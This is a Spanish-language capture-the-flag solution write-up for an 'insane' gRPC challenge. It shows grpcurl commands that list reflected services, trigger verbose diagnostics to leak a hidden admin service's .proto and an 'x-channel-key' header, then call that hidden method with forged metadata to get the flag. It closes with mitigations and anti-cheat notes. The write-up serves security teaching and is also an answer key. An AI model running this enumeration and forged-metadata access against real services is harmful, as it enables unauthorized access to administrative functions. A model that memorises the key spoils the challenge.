# Solución — api-grpc-04 · Silent Channel

**Categoría:** api · **Dificultad:** insane · **Puntos:** 600
**Vuln central:** reflexión gRPC PARCIAL (servicio admin oculto) + fuga del
`.proto` y de la clave del canal por diagnósticos verbosos + invocación de un
método administrativo oculto con metadata forjada.

## Resumen

`SilentChannel` es un servidor gRPC (HTTP/2) en `<host>:8080`. Tiene la
**reflexión gRPC habilitada**, pero solo anuncia el servicio público
`channel.SilentChannel`. El servicio administrativo `vault.AdminService` está
**registrado y atendiendo**, pero **se omite a propósito de la lista de
reflexión** → un `grpcurl list` no lo ve. El método `vault.AdminService/GetVault`
devuelve la FLAG si se le pasa la metadata `x-channel-key` correcta y
`confirm=true`.

| # | Paso | Mecanismo |
|---|------|-----------|
| 1 | Reconocimiento | Reflexión solo lista `channel.SilentChannel`; `GetServerInfo` avisa de un "silent operator channel" NO reflejado |
| 2 | Fuga de info | `Echo` con keyword de diagnóstico (`debug`/`trace`/`admin`/`vault`/`silent`/`channel`) vuelca el "operator runbook": nombre del servicio/método admin, el `.proto` de `VaultRequest`, el header `x-channel-key` exigido y su valor |
| 3 | Invocación oculta | Se reconstruye el `.proto` de `vault.AdminService` y se llama a `GetVault(vault_id="primary", confirm=true)` con metadata `x-channel-key: <valor>` → FLAG |

## Por qué la reflexión NO basta

`grpcurl -plaintext <host>:8080 list` devuelve solo:

```
channel.SilentChannel
grpc.reflection.v1alpha.ServerReflection
```

El servicio admin no aparece porque el servidor lo excluye de
`reflection.enable_server_reflection(...)`. La reflexión es una **lista de
permitidos manual**, no un volcado automático de todo lo registrado: el
operador "olvidó" añadir el admin a esa lista pensando que así quedaba secreto
(security through obscurity). El método sigue siendo invocable si conoces su
firma.

## Paso a paso (grpcurl)

```bash
# 1) Listar servicios -> el admin NO aparece (canal silencioso).
grpcurl -plaintext HOST:8080 list

# 2) Leer el aviso del servidor.
grpcurl -plaintext HOST:8080 channel.SilentChannel/GetServerInfo

# 3) Disparar los diagnósticos verbosos (fuga del proto + clave).
grpcurl -plaintext -d '{"message":"debug"}' \
    HOST:8080 channel.SilentChannel/Echo
#   -> diagnostics[] incluye:
#      hidden method : vault.AdminService/GetVault
#      request proto : message VaultRequest { string vault_id = 1; bool confirm = 2; }
#      auth          : metadata header 'x-channel-key'
#      x-channel-key : sk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
#      vault_id      : 'primary' (confirm true)
```

Con el `.proto` reconstruido a partir del runbook, guárdalo como `vault.proto`:

```proto
syntax = "proto3";
package vault;
service AdminService { rpc GetVault (VaultRequest) returns (VaultReply); }
message VaultRequest { string vault_id = 1; bool confirm = 2; }
message VaultReply  { string flag = 1; string message = 2; }
```

```bash
# 4) Invocar el método admin OCULTO con la metadata forjada.
grpcurl -plaintext -proto vault.proto \
    -H "x-channel-key: sk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
    -d '{"vault_id":"primary","confirm":true}' \
    HOST:8080 vault.AdminService/GetVault
#   -> { "flag": "HL4{...}", "message": "vault opened on the silent channel" }
```

> Nota: como el admin no está en la reflexión, hay que pasar el descriptor a
> mano (`-proto vault.proto`). grpcurl no lo puede descubrir solo.

## Exploit automatizado (Python)

`solution/exploit.py <host:puerto>` hace toda la cadena **sin** los stubs del
servidor: reconstruye los descriptores de `channel` y `vault` a mano (como un
jugador externo), dispara `Echo("debug")`, extrae la `x-channel-key` con regex,
e invoca `vault.AdminService/GetVault`. Salida verificada localmente:

```
[3] respuesta admin: message='vault opened on the silent channel'
[3] FLAG: HL4{...}
```

Requiere `pip install grpcio protobuf`.

## Por qué es INSANE

- La reflexión "funciona" y da una falsa sensación de tener el mapa completo;
  hay que **darse cuenta de que está incompleta** (servicio oculto).
- No hay esquema del admin disponible por reflexión: hay que **reconstruir el
  `.proto`** desde pistas en texto y armar el descriptor manualmente
  (FileDescriptorProto / `-proto`).
- La llamada exige **metadata específica** (`x-channel-key`) cuyo valor solo se
  obtiene tras disparar la fuga correcta, más `confirm=true` y `vault_id`
  exacto. Cada condición devuelve un código de error distinto que guía pero no
  regala.

## Mitigaciones (didáctico)

- No confiar en "ocultar" un servicio de la reflexión: aplicar
  **autenticación/autorización reales** por método (interceptor que valide
  identidad y rol antes de ejecutar el handler).
- **Desactivar la reflexión en producción** o restringirla a redes de
  operación.
- No filtrar nombres de servicios/métodos internos ni claves en mensajes de
  diagnóstico/error. Los errores deben ser genéricos.
- Tratar la `x-channel-key` como un secreto rotado y almacenado fuera del
  binario, no como una huella derivable del nombre/versión.

## Nota anti-cheat

La FLAG es **dinámica y única por equipo** (flag-service, `ARCHITECTURE §4`),
inyectada por env `FLAG`. La técnica (descubrir el servicio oculto + forjar la
metadata) es compartible, pero **la FLAG no**: cada equipo debe explotar SU
instancia para SU flag. La `x-channel-key` es deterministe e igual entre
instancias (es la huella del canal, no la flag) — por diseño NO da puntos por sí
sola; sirve solo para abrir el vault de cada equipo. Enviar la flag de otro
equipo dispara `cheat_flag_share` (`/whose-flag`). Además, los diagnósticos
verbosos, los intentos con clave inválida y la apertura del vault emiten eventos
SIEM (`scan_detected` warn/alert) al collector. Cada RPC se loguea como
`CTFREQ {...}` (proto `grpc`) a stdout para el overlay del stream.
